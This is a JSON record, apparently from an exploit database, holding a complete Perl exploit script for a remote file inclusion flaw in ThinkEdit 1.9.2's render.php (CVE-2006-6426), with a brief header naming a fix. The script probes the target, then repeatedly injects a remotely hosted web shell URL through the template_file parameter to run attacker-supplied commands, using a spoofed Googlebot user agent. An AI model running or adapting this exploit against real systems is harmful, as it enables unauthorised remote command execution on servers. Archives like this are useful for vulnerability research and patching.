{
  "id": "2898",
  "title": "ThinkEdit 1.9.2 - &#039;render.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-6426",
  "vuln_type": "unknown",
  "code": "#################################################################################################\r\n#                                    r0ut3r Presents...                                         #\r\n#                                                                                               #\r\n#                                Another r0ut3r discovery!                                      #\r\n#                                  writ3r [at] gmail.com                                        #\r\n#                                                                                               #\r\n#                         ThinkEdit Remote File Inclusion Exploit                               #\r\n#################################################################################################\r\n# Software: ThinkEdit 1.9.2                                                                     #\r\n#                                                                                               #\r\n# Vendor: http://www.thinkedit.org/                                                             #\r\n#                                                                                               #\r\n# Released: 2006/12/08                                                                          #\r\n#                                                                                               #\r\n# Discovered & Exploit By: r0ut3r (writ3r [at] gmail.com)                                       #\r\n#                                                                                               #\r\n# Note: The information provided in this document is for ThinkEdit administrator                #\r\n# testing purposes only!                                                                        #\r\n#                                                                                               #\r\n# Solution:                                                                                     #\r\n# Add the below code to the top of render.php                                                   #\r\n# if(basename(__FILE__) == basename($_SERVER['PHP_SELF']))                                      #\r\n#    die();                                                                                     #\r\n#                                                                                               #\r\n# Exploit:                                                                                      #\r\n# perl think.pl http://localhost /think/ http://localhost/cmd.txt cmd                           #\r\n#                                                                                               #\r\n# design/thinkedit/render.php?template_file=                                                    #\r\n#################################################################################################\r\n\r\n############################################################################\r\n#                  Remote File Inclusion Exploiter                         #\r\n#                                                                          #\r\n# This script attempts to exploit a remote file include vulnerability      #\r\n# by inserting a web shell into an include statement. A shell is then      #\r\n# spawned.                                                                 #\r\n#                                                                          #\r\n# Created By r0ut3r (writ3r [at] gmail.com)                                #\r\n############################################################################\r\n\r\nuse IO::Socket;\r\n\r\n$port = \"80\"; # connection port\r\n$target = @ARGV[0]; # localhost\r\n$folder = @ARGV[1]; # /think/\r\n$shellloc = @ARGV[2]; # http://localhost/cmd.txt\r\n$cmdv = @ARGV[3]; # cmd\r\n$vulnerable = false;\r\n$s = true;\r\n\r\nsub Header()\r\n{\r\n\tprint q {Remote File Inclusion Exploiter - By r0ut3r (writ3r [at] gmail.com)\r\n-------------------------------------------------------------------\r\n};\r\n}\r\n\r\nsub Usage()\r\n{\r\n\tprint q\r\n\t{\r\nUsage: think.pl [target] [directory] [shell_loc] [cmd_variable]\r\nperl think.pl http://localhost /think/ http://localhost/cmd.txt cmd\r\n};\r\n\texit();\r\n}\r\n\r\nHeader();\r\n\r\nif (!$target || !$folder || !$shellloc || !$cmdv) {\r\n\tUsage(); }\r\n\r\nif ($s eq false) { print \"[-] Shell not found\\n\"; exit(); }\r\n\r\n# Check if the script is vulnerable and register_globals are on (if needed)\r\n$vulnc = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => $target, PeerPort => $port) || die \"[-] Failed to connect on exploit attempt. Exiting...\\r\\n\";\r\nprint $vulnc \"GET \".$folder.\"render.php?template_file=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1\\n\";\r\nprint $vulnc \"Host: $target\\n\";\r\nprint $vulnc \"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\\n\";\r\nprint $vulnc \"Accept: text/html\\n\";\r\nprint $vulnc \"Connection: keep-alive\\n\\n\";\r\n\r\nwhile (<$vulnc>) {\r\n\tif (/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/) { $vulnerable = true; }\r\n}\r\n\r\nif ($vulnerable eq false) { print \"[-] Target not vulnerable, or register_globals could be off\\n\"; exit(); }\r\n\r\nprint \"[+] Starting shell\\n\";\r\nprint \"[cmd]\\$ \";\r\n$cmd = <STDIN>;\r\n$cmd =~ s/ /%20/g;\r\nwhile ($cmd !~ \"exit\")\r\n{\r\n\t$xpack = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => $target, PeerPort => $port) || die \"[-] Failed to connect on exploit attempt. Exiting...\\r\\n\";\r\n\tprint $xpack \"GET \".$folder.\"render.php?template_file=\".$shellloc.\"&\".$cmdv.\"=\".substr($cmd, 0, -1).\" HTTP/1.1\\n\";\r\n\tprint $xpack \"Host: $target\\n\";\r\n\tprint $xpack \"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\\n\";\r\n\tprint $xpack \"Accept: text/html\\n\";\r\n\tprint $xpack \"Connection: keep-alive\\n\\n\";\r\n\r\n\tprint \"[cmd]\\$ \";\r\n\t$cmd = <STDIN>;\r\n}\r\n\r\nprint \"[!] Connection to host lost...\\n\";\r\n\r\n# milw0rm.com [2006-12-08]",
  "url": "https://www.exploit-db.com/exploits/2898"
}